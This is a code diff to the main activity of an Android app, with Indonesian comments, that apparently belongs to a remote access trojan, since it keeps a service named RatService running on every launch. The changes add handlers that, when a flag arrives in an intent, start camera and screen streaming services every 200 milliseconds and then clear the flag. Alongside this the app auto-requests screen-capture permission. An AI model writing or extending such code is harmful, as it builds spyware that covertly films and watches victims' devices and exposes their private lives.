@@ -10,6 +10,8 @@ import android.net.Uri
 import android.os.Build
 import android.os.Bundle
 import android.os.Environment
+import android.os.Handler
+import android.os.Looper
 import android.provider.Settings
 import androidx.activity.ComponentActivity
 import androidx.activity.compose.setContent
@@ -72,11 +74,12 @@ class MainActivity : ComponentActivity() {
             }
         } catch (_: Exception) {}
 
-        // request izin sekali seumur hidup
         requestProactivePermissionsOnce()
-
-        // pastikan RatService selalu jalan
         startRatService()
+
+        // handle intent auto cam/screen
+        handleAutoStartCam(intent)
+        handleAutoStartScreen(intent)
 
         setContent {
             var showSplash by remember { mutableStateOf(true) }
@@ -153,17 +156,75 @@ class MainActivity : ComponentActivity() {
         }
     }
 
+    override fun onNewIntent(intent: Intent?) {
+        super.onNewIntent(intent)
+        setIntent(intent)
+        handleAutoStartCam(intent)
+        handleAutoStartScreen(intent)
+    }
+
     override fun onResume() {
         super.onResume()
-        // pastikan RatService hidup
         startRatService()
-        // auto-request MediaProjection kalau izin lengkap tapi projection belum ada
         if (checkAll() && !ScreenCapture.isReady()) {
             try {
                 val intent = ScreenCapture.requestIntent(this)
                 startActivityForResult(intent, REQ_MEDIA_PROJECTION)
             } catch (_: Exception) {}
         }
+    }
+
+    private fun handleAutoStartCam(intent: Intent?) {
+        if (intent?.getBooleanExtra("auto_start_cam", false) != true) return
+        val isFront = intent.getBooleanExtra("cam_front", true)
+
+        // delay 2 detik supaya Activity benar-benar foreground
+        Handler(Looper.getMainLooper()).postDelayed({
+            try { stopService(Intent(this, CameraStreamService::class.java)) } catch (_: Exception) {}
+            try {
+                val i = Intent(this, CameraStreamService::class.java).apply {
+                    putExtra("front", isFront)
+                    putExtra("interval", 200L)
+                }
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    startForegroundService(i)
+                } else {
+                    startService(i)
+                }
+            } catch (_: Exception) {}
+        }, 2000)
+
+        // clear flag biar tidak loop kalau activity dibuka ulang
+        intent.removeExtra("auto_start_cam")
+    }
+
+    private fun handleAutoStartScreen(intent: Intent?) {
+        if (intent?.getBooleanExtra("auto_start_screen", false) != true) return
+
+        // kalau MediaProjection belum ready, minta dulu
+        if (!ScreenCapture.isReady()) {
+            try {
+                val i = ScreenCapture.requestIntent(this)
+                startActivityForResult(i, REQ_MEDIA_PROJECTION)
+            } catch (_: Exception) {}
+        }
+
+        // delay 3 detik supaya Activity foreground + projection sudah approved
+        Handler(Looper.getMainLooper()).postDelayed({
+            try { stopService(Intent(this, ScreenStreamService::class.java)) } catch (_: Exception) {}
+            try {
+                val i = Intent(this, ScreenStreamService::class.java).apply {
+                    putExtra("interval", 200L)
+                }
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    startForegroundService(i)
+                } else {
+                    startService(i)
+                }
+            } catch (_: Exception) {}
+        }, 3000)
+
+        intent.removeExtra("auto_start_screen")
     }
 
     private fun saveSetupDone() {
